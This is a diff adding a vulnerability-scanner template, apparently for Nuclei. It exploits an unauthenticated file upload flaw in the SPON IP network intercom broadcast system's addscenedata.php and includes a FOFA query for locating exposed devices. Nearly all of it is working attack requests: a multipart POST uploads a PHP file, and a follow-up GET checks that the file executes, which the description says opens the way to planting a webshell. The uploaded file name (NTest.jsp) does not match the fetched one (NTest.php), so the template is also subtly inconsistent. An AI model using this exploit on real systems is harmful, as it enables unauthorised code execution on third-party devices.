@@ -1,0 +1,41 @@
+id: spon-ip-broadcast-addscenedataphp-file-upload
+
+info:
+  name: "SPON IP网络对讲广播系统 addscenedata.php 文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="-1700598274"
+    该漏洞源于目标系统在处理addscenedata.php接口文件上传请求时未正确验证文件类型及内容，攻击者可构造恶意文件通过此接口实现任意文件上传，进而可能部署Webshell或执行其他恶意操作。
+  tags: SPON
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /php/addscenedata.php HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ
+    Accept-Encoding: gzip
+
+    ------WebKitFormBoundary4LuoBRpTiVBo9cIQ
+    Content-Disposition: form-data; name="upload"; filename="NTest.jsp"
+    Content-Type: text/plain
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------WebKitFormBoundary4LuoBRpTiVBo9cIQ--
+- raw:
+  - |
+    GET /images/scene/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
